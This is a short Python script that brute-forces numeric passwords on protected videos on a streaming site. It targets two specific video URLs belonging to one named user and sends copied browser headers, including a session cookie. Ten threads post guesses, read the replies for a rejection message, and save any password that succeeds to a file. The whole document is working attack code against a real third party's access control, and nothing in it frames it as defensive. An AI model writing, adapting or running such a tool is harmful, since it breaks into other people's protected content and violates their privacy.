import time 
import requests
import threading

def crack(pw_start, pw_end, url, headers, flag):
    i = pw_start
    while i < pw_end:
        try:
            response = requests.post(url=url, data=f"password={i}".encode(), headers=headers)
            if response.status_code == 200:
                index = response.text.find("Incorrect Secret Word")
                if index != -1:
                    print(f"{threading.current_thread().getName()}: incorrect pssword {i}")
                else:
                    print(f"{threading.current_thread().getName()}: correct pssword {i}, status code {response.status_code}")
                    flag[0] = True
                    with open("password", "w") as file:
                        file.write(f"correct password: {i}")
            else:
                print(f"{threading.current_thread().getName()}: correct pssword {i}, status code {response.status_code}")
                flag[0] = True
                with open("password", "w") as file:
                    file.write(f"correct password: {i}")
            i += 1
            time.sleep(0.5)
        except:
            print(f"{threading.current_thread().getName()}: ConnectionError occured...waiting")
            i -= 1
            time.sleep(30)
URL_0520 = "https://twitcasting.tv/mi_tagun/movie/614559245"
URL_0329 = "https://twitcasting.tv/mi_tagun/movie/602491833"
HEADERS = {
    "Host": "twitcasting.tv",
    "Connection": "keep-alive",
    "Content-Length": "13",
    "Cache-Control": "max-age=0",
    "sec-ch-ua": '" Not;A Brand";v="99", "Microsoft Edge";v="97", "Chromium";v="97"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"macOS"',
    "Upgrade-Insecure-Requests": "1",
    "Origin": "https://twitcasting.tv",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.76",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://twitcasting.tv/mi_tagun/movie/614559245",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Cookie": "did=b21ff74995f5dd57f54a22858eabe25f; _ga=GA1.2.734859558.1646115977; _gid=GA1.2.1290544330.1646115977"
}
MAX_THREAD = 10
STEP = 10
PW_BEG = 0


try_pw = PW_BEG
mythreads = []
isFind = [False]
start_time = time.time()
while try_pw < 100:
    if not isFind[0]:
        for i in range(MAX_THREAD):
            args = (try_pw + i * STEP, try_pw + (i + 1) * STEP, URL_0329, HEADERS, isFind)
            t = threading.Thread(target=crack, args=args)
            mythreads.append(t)
            t.start()
        try_pw += MAX_THREAD * STEP
        for thread in mythreads:
            thread.join()
        mythreads = []
    else:
        break
end_time = time.time()
print(end_time - start_time)
